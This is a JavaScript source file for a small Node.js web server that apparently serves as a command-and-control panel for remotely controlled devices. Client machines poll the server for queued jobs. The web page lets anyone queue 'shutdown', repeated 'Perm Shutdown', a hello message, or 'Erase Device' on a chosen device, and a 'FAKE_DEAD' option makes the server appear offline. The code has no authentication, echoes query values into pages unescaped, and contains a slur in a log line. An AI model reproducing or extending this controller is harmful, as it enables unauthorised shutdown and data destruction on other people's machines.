const http = require('http');
const url = require('url');
const fs = require('fs');

const port = 1040;
var versionNumber = "V 0.1.2.0";

// Valid commands
var ster = 
[
	    "shutdown", 
	    "SpamShutdown", 
	    "SayHey", 
	    "delall"
];

var commandsNonPerm = 
[ 
	["shutdown", "Shutdown"], 
        ["SpamShutdown", "Perm Shutdown"], 
        ["SayHey", "Display Hello Message"] 
];

var commandsPerm = 
[ 
	["delall", "Erase Device"] 
];

var msRefreshCooldown = "100";

// Set message to FAKE_DEAD to fake dead
const selectDeviceWarning = "SELECT A DEVICE"

const curAction        = "/curAction";
const addAction        = "/addAction";
const info             = "/info";
const SelectADevice    = "/device";
const Type             = "/selectTypeOfPersistance";
const nonPerm          = "/nonperm";
const    Perm          = "/perm";

var devices_MACS            	= [];
var devices_NickNames       	= [];
var devices_Actions         	= [];
var devices_Actions_arg     	= [];
var devices_Actions_Ip      	= [];
var devices_RegisteredCommands  = [];

function displayHeader(content, urlObj) {
    content += fs.readFileSync('./css.css', 'utf8');
      
    var indx = devices_MACS.indexOf(`${urlObj.query.deviceID}`);

    if(urlObj.query.deviceID) {
        content  += 
        `<form class="type1" method="get">
            <input type="hidden" id="type" name="type" value=Home>
            
            <h1 style="font-size: 100%;">${devices_NickNames[devices_MACS.indexOf(urlObj.query.deviceID)]}</h1>
            <h1 style="font-size: 100%;">${devices_MACS     [devices_MACS.indexOf(urlObj.query.deviceID)]}</h1>
            
        `;

        var i = 0;
        devices_Actions.forEach(e => {
            if(e !== "") {
                content += `<br>-> ${e} - queued by ${devices_Actions_Ip[indx]}`;
            }
        })

        content += `
        <br>
            <input type="submit" value="Device List">
        `;    

    }
    else {
        content  += 
        `<form class="type1" method="get">
            <input type="hidden" id="type" name="type" value=Home>
            
            <h1 style="font-size: 100%;">Rawr welcome fam idk what to put here rawrrrrrr!~</h1>
            <h1 style="font-size: 100%;">Version: ${versionNumber}!~</h1>
            <h1 hidden="true" style="font-size: 100%;">Conni!~#0920~</h1>
            
        `;
    }
    content += `
    </form>`;

    return content;
}

http.createServer((req, res) => {
    let content = '';

    const urlObj = url.parse(req.url, true);

    pathN = urlObj.pathname;

    console.log(pathN);

    var AddAction = false;
    
    if(urlObj.query.type === "NonPerm") {
        pathN = nonPerm;
        AddAction = true;
    }
    else if (urlObj.query.type === "Perm") {
        pathN = Perm;
        AddAction = true;
    }
    else if (urlObj.query.type === "Home") {
     	content += `<script>setTimeout(function(){location.reload()},${msRefreshCooldown});</script>`;
     	pathN = SelectADevice;
    }

    if(pathN === info) {
        if(urlObj.query.deviceID) {
            content  = `Server Version: ${versionNumber} - Client MAC: ${urlObj.query.deviceID}`;
        } else {
            content  = `Server Version: ${versionNumber}`;
        }

        if(urlObj.query.data === "Jobs") {
            if(!devices_MACS.includes(urlObj.query.deviceID)) {
                devices_MACS     .push(urlObj.query.deviceID);
                devices_NickNames.push("Unnamed");
            }

            var indx = devices_MACS.indexOf(`${urlObj.query.deviceID}`);

            content = `CurJob: ${devices_Actions[indx]}`;
        }
        res.writeHead(200, {
            'content-type': 'text/html;charset=utf-8',
        });
        
        res.write(content);
        res.end();
    }
    else if(pathN === SelectADevice) {
        content = displayHeader(content, urlObj);
     	content += `<script>setTimeout(function(){location.reload()},${msRefreshCooldown});</script>`;
     	        
        var i = 0;
        devices_MACS.forEach(r => {
            content  += `<form action="${Type}" method="get"><input type="hidden" id="deviceID" name="deviceID" value=${r}><input type="submit" value="${r} - ${devices_NickNames[i]}"></form>`;
            i = i + 1;
        });

        
        res.write(content);
        res.end();
    }
    else if (pathN === Type) {        
        content = displayHeader(content, urlObj);

        content += `<form action="${nonPerm}" method="get"><input type="hidden" id="deviceID" name="deviceID" value=${urlObj.query.deviceID}><input type="submit" value="Non Perminant Actions"></form>`;
        content += `<form action="${   Perm}" method="get"><input type="hidden" id="deviceID" name="deviceID" value=${urlObj.query.deviceID}><input type="submit"    value="Perminant Actions"></form>`;

        res.writeHead(200, {
            'content-type': 'text/html;charset=utf-8',
        });
        
        res.write(content);
        res.end();
    }
    if(urlObj.query.deviceID === "undefined") {
        if(selectDeviceWarning !== "FAKE_DEAD") {
            content = selectDeviceWarning;
                
            res.writeHead(200, {
                'content-type': 'text/html;charset=utf-8',
            });
            
            res.write(content);
            res.end();
        }
    }
    else if(pathN === addAction || AddAction === true) {
        
        console.log(`Adding new action! -${urlObj.query.action}-`);

        var indx = devices_MACS.indexOf(`${urlObj.query.deviceID}`);

        if(ster.includes(urlObj.query.action)) {
            if(devices_Actions.includes(urlObj.query.action)) {
              console.log("Action has already been queued!");
            } else {
                console.log("Action queued with success!");
                console.log(devices_Actions);
                console.log(devices_Actions_Ip);
                
                devices_Actions   .push(urlObj.query.action);
                devices_Actions_Ip.push(`${req.connection.remoteAddress} - ${req.headers['x-forwarded-for']}`);

                console.log(devices_Actions);
                console.log(devices_Actions_Ip);
            }
        } else {
            console.log(`Command unknown! -${urlObj.query.action}-`);
        }
    }
    else if(pathN === curAction) {
        var indx = devices_MACS.indexOf(`${urlObj.query.deviceID}`);
        var i = 0;
        content = ``;
        if(!devices_Actions) {
            res.writeHead(200, {
                'content-type': 'text/html;charset=utf-8',
            });
            
            res.write(content);
            res.end();
            return;
        }
        devices_Actions.forEach(e => {
            if(e !== "") {
                content = `${e}`;
            }
        })

        res.writeHead(200, {
            'content-type': 'text/html;charset=utf-8',
        });
        
        if(content === "undefined") {
        	console.log("Undefined cunt..");
        	return;
        }
        res.write(content);
        res.end();

        devices_Actions.splice(indx);
        return;
    }
	
    if(pathN === nonPerm) {
        content = displayHeader(content, urlObj);

        commandsNonPerm.forEach(commandName => {
            content  += `<form action="${addAction}" method="get"><input type="hidden" id="type" name="type" value=NonPerm><input type="hidden" id="deviceID" name="deviceID" value=${urlObj.query.deviceID}><input type="hidden" id="action" name="action" value=${commandName[0]}><input type="submit" value="${commandName[1]}"></form>`;
        });
        
        res.writeHead(200, {
            'content-type': 'text/html;charset=utf-8',
        });
        
        res.write(content);
        res.end();
    }
    else if(pathN === Perm) {
        content = displayHeader(content, urlObj);

        content += `<script>setTimeout(function(){location.reload()},${msRefreshCooldown});</script>`;

        commandsPerm.forEach(commandName => {
            content  += `<form action="${addAction}" method="get"><input type="hidden" id="type" name="type" value=Perm><input type="hidden" id="deviceID" name="deviceID" value=${urlObj.query.deviceID}><input type="hidden" id="action" name="action" value=${commandName[0]}><input type="submit" value="${commandName[1]}"></form>`;
        });
        
        // Give a response
        res.writeHead(200, {
            'content-type': 'text/html;charset=utf-8',
        });
        
        res.write(content);
        res.end();
    }

})
.listen(port);
